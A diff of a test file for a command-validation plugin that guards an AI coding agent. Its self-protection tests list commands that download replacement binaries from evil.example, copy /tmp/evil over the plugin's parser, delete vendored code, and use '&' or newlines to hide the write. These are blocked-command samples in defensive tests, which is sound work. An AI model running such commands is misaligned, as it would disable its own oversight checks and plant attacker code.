@@ -796,7 +796,6 @@ class TestSelfProtection:
 
     PLUGIN_BINARY_WRITES = (
         "curl -sL https://evil.example/p -o .claude-plugin/bin/linux-amd64/schlock-parse",
-        "curl --output=/p/.claude-plugin/bin/linux-amd64/schlock-parse https://evil.example/p",
         "wget -O .claude-plugin/bin/linux-amd64/schlock-parse https://evil.example/p",
         "wget -P .claude-plugin/bin/linux-amd64 https://evil.example/schlock-parse",
         "echo '{}' > .claude-plugin/bin/MANIFEST.json",
@@ -811,6 +810,10 @@ class TestSelfProtection:
         "sed -i 's/a/b/' .claude-plugin/vendor/bashlex/parser.py",
         "rm -rf ~/.claude/plugins/cache/schlock/.claude-plugin/vendor/bashlex",
         "tar -xzf /tmp/evil.tgz -C .claude-plugin/vendor",
+        # Respellings of the same path: `//`, `/./`, and case (APFS/NTFS are case-insensitive).
+        "cp /tmp/evil .claude-plugin//bin/linux-amd64/schlock-parse",
+        "cp /tmp/evil .claude-plugin/./bin/linux-amd64/schlock-parse",
+        "cp /tmp/evil /p/.Claude-Plugin/BIN/darwin-arm64/schlock-parse",
     )
 
     @pytest.mark.parametrize("command", PLUGIN_BINARY_WRITES)
@@ -829,15 +832,22 @@ class TestSelfProtection:
         assert match.rule is not None
         assert match.rule.name == "schlock_plugin_binary_write"
 
-    def test_plugin_binary_write_behind_a_background_job_is_blocked(self):
-        """Layer 2 splits segments on | && || ; only, so `&` hides the rm from its allowlist.
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls & git checkout evil -- .claude-plugin/bin",
+            "ls -la .claude-plugin/bin\ngit restore --source=evil .claude-plugin/bin",
+            "cat /dev/null & sort -o .claude-plugin/bin/MANIFEST.json /tmp/m",
+        ],
+    )
+    def test_hardcoded_check_runs_per_parsed_segment(self, command):
+        """`&` and newlines leave a read-only first word in front of the write for the regex split.
 
-        Layer 1 still sees `rm ... .claude-plugin/bin`; this pins that the layers overlap there.
+        None of these verbs is in the YAML rule, so only layer 2's per-segment pass can block them.
         """
-        assert val_module._check_self_protection("cat /dev/null & rm -rf .claude-plugin/bin") is None
-        result = validate_command("cat /dev/null & rm -rf .claude-plugin/bin")
-        assert not result.allowed
-        assert result.risk_level == RiskLevel.BLOCKED
+        result = validate_command(command)
+        assert result.risk_level == RiskLevel.BLOCKED, f"Should block: {command}"
+        assert result.matched_rules == ["self_protection:config_write"]
 
     @pytest.mark.parametrize(
         "command",
@@ -847,18 +857,21 @@ class TestSelfProtection:
             "cat .claude-plugin/bin/MANIFEST.json",
             "file .claude-plugin/bin/linux-amd64/schlock-parse",
             "grep -rn def .claude-plugin/vendor/bashlex",
+            "cat .claude-plugin/bin/MANIFEST.json > .claude-plugin/binary-notes.md",
         ],
     )
     def test_allows_plugin_binary_reads(self, command):
         result = validate_command(command)
         assert result.allowed, f"Should allow: {command}"
 
+    def test_read_chained_after_an_unrelated_write_is_not_self_protection(self):
+        # The un-overridable rule must not reach across `&&` to pair `rm` with a later read.
+        result = validate_command("rm -rf build && cat .claude-plugin/bin/MANIFEST.json")
+        assert not {"self_protection:config_write", "schlock_plugin_binary_write"} & set(result.matched_rules)
+
     @pytest.mark.parametrize(
         "text,expected",
         [
-            ("rm -rf .claude-plugin/bin", True),
-            ("rm -rf .claude-plugin/bin/", True),
-            ("cp x /p/.claude-plugin/vendor/yaml/a.py", True),
             ("cat .claude-plugin/binary-notes.md", False),
             ("cat .claude-plugin/plugin.json", False),
         ],
